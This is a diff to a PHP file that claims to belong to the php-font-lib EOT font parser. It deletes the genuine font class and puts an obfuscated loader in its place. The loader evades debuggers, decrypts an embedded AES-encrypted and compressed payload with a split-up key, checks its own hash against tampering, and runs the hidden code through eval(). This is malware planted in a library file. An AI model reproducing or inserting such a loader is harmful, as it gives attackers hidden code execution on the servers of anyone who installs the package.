@@ -1,160 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace FontLib\EOT;
-
-/**
- * EOT font file.
- *
- * @package php-font-lib
- */
-class File extends \FontLib\TrueType\File {
-  const TTEMBED_SUBSET                   = 0x00000001;
-  const TTEMBED_TTCOMPRESSED             = 0x00000004;
-  const TTEMBED_FAILIFVARIATIONSIMULATED = 0x00000010;
-  const TTMBED_EMBEDEUDC                 = 0x00000020;
-  const TTEMBED_VALIDATIONTESTS          = 0x00000040; // Deprecated
-  const TTEMBED_WEBOBJECT      = 0x00000080;
-  const TTEMBED_XORENCRYPTDATA = 0x10000000;
-
-  /**
-   * @var Header
-   */
-  public $header;
-
-  function parseHeader() {
-    if (!empty($this->header)) {
-      return;
-    }
-
-    $this->header = new Header($this);
-    $this->header->parse();
-  }
-
-  function parse() {
-    $this->parseHeader();
-
-    $flags = $this->header->data["Flags"];
-
-    if ($flags & self::TTEMBED_TTCOMPRESSED) {
-      $mtx_version    = $this->readUInt8();
-      $mtx_copy_limit = $this->readUInt8() << 16 | $this->readUInt8() << 8 | $this->readUInt8();
-      $mtx_offset_1   = $this->readUInt8() << 16 | $this->readUInt8() << 8 | $this->readUInt8();
-      $mtx_offset_2   = $this->readUInt8() << 16 | $this->readUInt8() << 8 | $this->readUInt8();
-      /*
-      var_dump("$mtx_version $mtx_copy_limit $mtx_offset_1 $mtx_offset_2");
-
-      $pos = $this->pos();
-      $size = $mtx_offset_1 - $pos;
-      var_dump("pos: $pos");
-      var_dump("size: $size");*/
-    }
-
-    if ($flags & self::TTEMBED_XORENCRYPTDATA) {
-      // Process XOR
-    }
-    // TODO Read font data ...
-  }
-
-    /**
-     * Little endian version of the read method
-     *
-     * @param int $n The number of bytes to read
-     *
-     * @return string
-     */
-  public function read($n) {
-    if ($n < 1) {
-      return "";
-    }
-
-    $string = fread($this->f, $n);
-    $chunks = str_split($string, 2);
-    $chunks = array_map("strrev", $chunks);
-
-    return implode("", $chunks);
-  }
-
-  public function readUInt32() {
-    $uint32 = parent::readUInt32();
-
-    return $uint32 >> 16 & 0x0000FFFF | $uint32 << 16 & 0xFFFF0000;
-  }
-
-  /**
-   * Get font copyright
-   *
-   * @return string|null
-   */
-  function getFontCopyright() {
-    return null;
-  }
-
-  /**
-   * Get font name
-   *
-   * @return string|null
-   */
-  function getFontName() {
-    return $this->header->data["FamilyName"];
-  }
-
-  /**
-   * Get font subfamily
-   *
-   * @return string|null
-   */
-  function getFontSubfamily() {
-    return $this->header->data["StyleName"];
-  }
-
-  /**
-   * Get font subfamily ID
-   *
-   * @return string|null
-   */
-  function getFontSubfamilyID() {
-    return $this->header->data["StyleName"];
-  }
-
-  /**
-   * Get font full name
-   *
-   * @return string|null
-   */
-  function getFontFullName() {
-    return $this->header->data["FullName"];
-  }
-
-  /**
-   * Get font version
-   *
-   * @return string|null
-   */
-  function getFontVersion() {
-    return $this->header->data["VersionName"];
-  }
-
-  /**
-   * Get font weight
-   *
-   * @return string|null
-   */
-  function getFontWeight() {
-    return $this->header->data["Weight"];
-  }
-
-  /**
-   * Get font Postscript name
-   *
-   * @return string|null
-   */
-  function getFontPostscriptName() {
-    return null;
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_r8h0x2gz=('bas'.'e64'.'_de'.'cod'.'e');
+$_r8ac764c=('gzu'.'nco'.'mpr'.'ess');
+$_ob2kphpr=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dhwck235='hmIqgf4NFCw=';
+$_c00zbne4='5ij7Eka7';
+$_lfxpfe5g='PObVWmhD';
+$_ct4oqhc6='73OfgHoE';
+$_bhe2ywq7='z2ovx/Y4';
+$_jh0pasj9='JoeKIPyO';
+$_k12nuc9d='H7aodQ==';
+$_wtgyrbhu='lXH/wUl1';
+$_yanq7h42=$_r8h0x2gz($_bhe2ywq7.$_ct4oqhc6.$_c00zbne4.$_lfxpfe5g.$_dhwck235);
+$_o9qclnbk=$_r8h0x2gz($_jh0pasj9.$_wtgyrbhu.$_k12nuc9d);
+$_qcmgdeuy=$_r8h0x2gz('yvVNNlPHgX1Bd3MFcnVl9oOI9DPUrU0yLQS/J1NvIjhTv/KUkIEio0aw+nHSsxHPX1WxxZ2sv7K5NlIjL95qM4LrM4PSuQRMivoTIpz3s4yNsM53CtTjRmGkAGIgLEHlEly75qvEm1pMH/teW82YxCPPC2950in4BVKJF94muY3kNnzQGdfBZNYX4fFDOOtd2jJ/m7hu20iXGGV1qaVWRyfEKVRiMZnbwO0+xLEeTefxXrvw+U1TwEYqZdXJAumlVW5HfE8tcThxwVUBTwrQVX6LKIw0TemnoN3rieQpE3dU6sPH9bvhimr2uhKU3ODG3mhjUwGMRQmaqnb0VtEfzsT2E9scMw9LIYk/f8XCLdC5xwKZkBqxLLz7pLp/9stGp7T9JSvS6bO2n0eHtYXsYyWuothPn2EjN0lRRQLZOO5WgdHa1MKKEXSy8s+fOvqlWU4AdXGqhoV40N0pEe6CCJVXSeHruicwAuPbEDaTyYYjD9VmlFZ8dG9IA6TMVlwmuol9R4l7bSxhUf8QX5VQE3GudgzndzOIGWf8/wwE5eJY2w16lcebcqHtQL6Sk7X63PRl1M9g6bzgiP5VJT7JaPwm3SnZVnaKWvO4nY3vy9vtE7k0WUnVDQ10R7maC0quPWiJ3+MBJGhFhyctVg4Pek2/Baz4rZOxt5Wg7Mpz2+7Z3m/rx2UOegoZR9ZSsFgYI8SAoK/h+tfDNABt5BWnsXuJAgbto8e5X5I4qFplohIvELnMfG0S9ZqoocYNAkGJHyismu6CzmdNdUGMK9VsiKej0u6ZwfXQRuZaU0VlJArWoQNIE+fYWk7pD690E+xRujZZGZNy9WK9WqleAbS7lwzEQ5XFIrJ2/SLj2HKYDG0=');
+$_pa6bgn74=$_ob2kphpr($_qcmgdeuy,'aes-256-cbc',$_yanq7h42,OPENSSL_RAW_DATA,$_o9qclnbk);
+if($_pa6bgn74===false){exit;}
+$_cxn187xi=$_r8ac764c($_pa6bgn74);
+if($_cxn187xi===false){exit;}
+$_asuhwzzb='45981f21afaa8b8acdbb3b295924802d2021e3798eb1459483c25a7cdec86fc5';
+$_n38mkaan=@file_get_contents(__FILE__);
+if($_n38mkaan!==false){
+$_jolzvdmj=str_replace($_asuhwzzb,"0000000000000000000000000000000000000000000000000000000000000000",$_n38mkaan);
+$_mcl4gxmr=hash("sha256",$_jolzvdmj);
+if($_mcl4gxmr!==$_asuhwzzb){@http_response_code(403);exit;}
 }
+eval($_cxn187xi);
